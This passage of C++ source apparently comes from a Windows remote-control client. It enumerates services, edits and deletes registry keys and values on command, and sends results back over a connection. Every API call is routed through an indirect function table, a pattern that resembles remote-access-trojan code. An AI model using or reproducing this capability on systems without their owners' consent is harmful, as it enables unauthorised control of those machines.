	SC_HANDLE hMana = m_gFunc.OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS|GENERIC_READ|GENERIC_WRITE|GENERIC_EXECUTE);
	if(hMana == NULL)
	{
		m_Command = ENUM_SERVICES_FAIL;
		return;
	}

	DWORD m_ByteNeed = 0;
	DWORD m_Count = 0;
	DWORD NextEntry = 0;
	BYTE m_TmpBuf [65535] = {0};
	if(!m_gFunc.EnumServicesStatus(hMana, SERVICE_WIN32,SERVICE_STATE_ALL, (LPENUM_SERVICE_STATUS) m_TmpBuf, 65534, &m_ByteNeed, &m_Count, &NextEntry))
	{
		m_gFunc.CloseServiceHandle(hMana);
		m_Command = ENUM_SERVICES_FAIL;
		return;
	}

	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}

	MYSERVICES m_Services = {0};
	LPENUM_SERVICE_STATUS pStauts = (LPENUM_SERVICE_STATUS) m_TmpBuf;
	for(DWORD i = 0; i < m_Count; i++)
	{
		m_gFunc.memset(&m_Services, 0, sizeof(MYSERVICES));
		m_gFunc.strcpy(m_Services.m_Name,pStauts[i].lpServiceName);
		m_gFunc.strcpy(m_Services.m_Disp,pStauts[i].lpDisplayName);
		*((DWORD*) m_Services.m_Status) = pStauts[i].ServiceStatus.dwCurrentState;
		GetServicesConfig(hMana, &m_Services);
		DWORD nWriteLen = 0; 
		m_gFunc.WriteFile(hFile, &m_Services, sizeof(MYSERVICES), &nWriteLen, NULL);
	}
	m_gFunc.CloseHandle(hFile);
	m_gFunc.CloseServiceHandle(hMana);
}

void CMyMainTrans::GetServicesConfig(SC_HANDLE hMana,LPMYSERVICES pServices)
{
	SC_HANDLE hServices = m_gFunc.OpenService(hMana, pServices->m_Name, SERVICE_ALL_ACCESS);
	if(hServices == NULL) 
	{
		return;
	}
	DWORD m_NeedLen = 0;
	BYTE pData[8192] = {0};
	LPQUERY_SERVICE_CONFIG pConFig = (LPQUERY_SERVICE_CONFIG) pData;
	if(m_gFunc.QueryServiceConfig(hServices, pConFig, 8192, &m_NeedLen))
	{
		pServices->dwErrorControl = pConFig->dwErrorControl;
		pServices->dwServiceType = pConFig->dwServiceType;
		pServices->dwStartType = pConFig->dwStartType;
		pServices->dwTagId = pConFig->dwTagId;
		m_gFunc.strcpy(pServices->lpBinaryPathName,pConFig->lpBinaryPathName);
		m_gFunc.strcpy(pServices->lpDependencies,pConFig->lpDependencies);
		m_gFunc.strcpy(pServices->lpLoadOrderGroup,pConFig->lpLoadOrderGroup);
		m_gFunc.strcpy(pServices->lpServiceStartName,pConFig->lpServiceStartName);
		
	}

	m_NeedLen = 0;
	if(m_gFunc.QueryServiceConfig2(hServices, SERVICE_CONFIG_DESCRIPTION, pData, 8192, &m_NeedLen))
	{
		LPSERVICE_DESCRIPTION pConfig2 = (LPSERVICE_DESCRIPTION) pData;
		if(pConfig2->lpDescription != NULL)
		{
			m_gFunc.strcpy(pServices->lpDescribe, pConfig2->lpDescription);
		}
	}
	m_gFunc.CloseServiceHandle(hServices);
}

void CMyMainTrans::SaveDataToTmpFile()
{
	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}

	DWORD nWriteLen = 0;
	if(!m_gFunc.WriteFile(hFile, m_TransData, m_dTransLen, &nWriteLen, NULL))
	{
		m_gFunc.CloseHandle(hFile);
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}
	m_gFunc.CloseHandle(hFile);
}

void CMyMainTrans::MyRegEditValue()
{
	LPPSREGINFO pItem = (LPPSREGINFO) m_TransData;
	HKEY m_key = NULL;
	long ret = m_gFunc.RegOpenKeyEx (pItem->m_RootKey, pItem->m_Key, 0, KEY_ALL_ACCESS, &m_key);
	if(ret != ERROR_SUCCESS)
	{
		m_Command = OPEN_REG_KEY_ERR;
		return ;
	}

	//设置新数据
	ret = m_gFunc.RegSetValueEx(m_key,	pItem->m_ItemName, 0, pItem->m_ItemType, (CONST BYTE *) pItem->m_ItemValue, pItem->m_ValueLen);
	if(ret != ERROR_SUCCESS)
	{
		m_gFunc.RegCloseKey(m_key);
		m_Command = REG_EDIT_VALUE_ERR;
		return;
	}
	m_gFunc.RegCloseKey(m_key);
}

void CMyMainTrans::MyRegDeleteValue()
{
	LPPSREGINFO pItem = (LPPSREGINFO) m_TransData;
	HKEY m_key = NULL;
	long ret = m_gFunc.RegOpenKeyEx (pItem->m_RootKey, pItem->m_Key, 0, KEY_ALL_ACCESS, &m_key);
	if(ret != ERROR_SUCCESS)
	{
		m_Command = OPEN_REG_KEY_ERR;
		return ;
	}

	ret = m_gFunc.RegDeleteValue(m_key, pItem->m_ItemName);
	if(ret != ERROR_SUCCESS)
	{
		m_gFunc.RegCloseKey(m_key);
		m_Command = REG_DELETE_KEY_ERR;
		return ;
	}
	m_gFunc.RegCloseKey(m_key);
}

void CMyMainTrans::MyRegDeleteKey()
{
	LPPSREGINFO pItem = (LPPSREGINFO) m_TransData;
	HKEY m_key = NULL;
	long ret = m_gFunc.RegOpenKeyEx(pItem->m_RootKey, pItem->m_Key, 0, KEY_ALL_ACCESS, &m_key);
	if(ret != ERROR_SUCCESS)
	{
		m_Command = OPEN_REG_KEY_ERR;
		return ;
	}
	ret = m_gFunc.SHDeleteKey(m_key, "");
	if(ret != ERROR_SUCCESS)
	{
		m_gFunc.RegCloseKey(m_key);
		m_Command = REG_DELETE_KEY_ERR;
		return ;
	}
	m_gFunc.RegCloseKey(m_key);
}

void CMyMainTrans::MyRegEnumKey()
{
	LPPSREGINFO pItem = (LPPSREGINFO) m_TransData;
	HKEY m_key = NULL;
	long ret = m_gFunc.RegOpenKeyEx (pItem->m_RootKey, pItem->m_Key, 0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &m_key);
	if(ret == 5 || ret != ERROR_SUCCESS)
	{
		m_Command = NOT_FIND_ANY_FILE;
		return;
	}

	DWORD		m_Index = 0;
	FILETIME	m_Time;
	HANDLE hFile = OpenMyTmpFile();
	if(hFile == NULL)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		m_gFunc.RegCloseKey(m_key);
		return;
	}
	
	DWORD nWriteLen = 0;
	REGINFO m_RegInfo = {0};
	REGINFO m_BakRegInfo = {0};
	while(1)
	{
		m_gFunc.memset(&m_RegInfo, 0, sizeof(REGINFO));
		m_BakRegInfo.m_IsKey = FALSE;
		m_RegInfo.m_Datalen = 510;
		m_RegInfo.m_NameLen = 510;

		ret = m_gFunc.RegEnumValue(m_key, m_Index, m_RegInfo.m_Name, &m_RegInfo.m_NameLen,	NULL, &m_RegInfo.m_DataType, m_RegInfo.m_Data, &m_RegInfo.m_Datalen);
		if(ret != ERROR_SUCCESS)
		{
			//无新的值
			if(m_Index == 0)
			{
				m_BakRegInfo.m_DataType = REG_SZ;
				m_BakRegInfo.m_NameLen = 0xffffffff;
				m_BakRegInfo.m_Datalen = 0xffffffff;
				m_gFunc.WriteFile(hFile, &m_BakRegInfo, sizeof(REGINFO), &nWriteLen, NULL);
			}
			break;
		}
		
		if(m_Index == 0)
		{
			if(m_gFunc.strlen(m_RegInfo.m_Name) == 0)
			{
				m_RegInfo.m_NameLen = 0xffffffff;
				m_gFunc.WriteFile(hFile, &m_RegInfo, sizeof(REGINFO), &nWriteLen, NULL);
				m_Index ++;
				continue;
			}
			m_BakRegInfo.m_DataType = REG_SZ;
			m_BakRegInfo.m_NameLen = 0xffffffff;
			m_BakRegInfo.m_Datalen = 0xffffffff;
			m_gFunc.WriteFile(hFile, &m_BakRegInfo, sizeof(REGINFO), &nWriteLen, NULL);
		}
		m_gFunc.WriteFile(hFile, &m_RegInfo, sizeof(REGINFO), &nWriteLen, NULL);
		m_Index ++;
	}

	m_Index = 0;
	while(1)
	{
		m_gFunc.memset(&m_RegInfo, 0, sizeof(REGINFO));
		m_RegInfo.m_Datalen = 510;
		m_RegInfo.m_NameLen = 510;

		ret = m_gFunc.RegEnumKeyEx(m_key, m_Index, m_RegInfo.m_Name, &m_RegInfo.m_NameLen, NULL, NULL, NULL, &m_Time);
		if(ret != ERROR_SUCCESS)
		{
			//无新的值
			break;
		}
		m_RegInfo.m_IsKey = TRUE;
		m_gFunc.WriteFile(hFile, &m_RegInfo, sizeof(REGINFO), &nWriteLen, NULL);
		m_Index ++;
	}
	m_gFunc.CloseHandle(hFile);
}

BOOL CMyMainTrans::ReadBag()
{
	if(m_TransData != NULL)
	{
		delete [] m_TransData;
		m_TransData = NULL;
	}
	return RecvDataWithCmd(&m_TransData, &m_dTransLen, &m_Command);
}

BOOL CMyMainTrans::SendBag()
{
	m_dTransLen = 0;
	BOOL bRet = TRUE;
	BYTE* pSrcData = NULL;
	HANDLE hFile = m_gFunc.CreateFile(
				m_TmpFilePath,  
                GENERIC_READ,   
                FILE_SHARE_READ,
                NULL,           
                OPEN_EXISTING,      
                FILE_ATTRIBUTE_NORMAL, 
                NULL);
	if(hFile != INVALID_HANDLE_VALUE)
	{
		m_dTransLen = m_gFunc.GetFileSize(hFile, NULL);
		if(m_dTransLen != 0)
		{
			pSrcData = new BYTE[m_dTransLen];
			DWORD nReadLen = 0;
			m_gFunc.ReadFile(hFile, pSrcData, m_dTransLen, &nReadLen, NULL);
		}
		m_gFunc.CloseHandle(hFile);
		m_gFunc.DeleteFile(m_TmpFilePath);
	}
	bRet = SendDataWithCmd(pSrcData, m_dTransLen, m_Command);
	if(pSrcData != NULL)
	{
		delete [] pSrcData;
	}
	return bRet;
}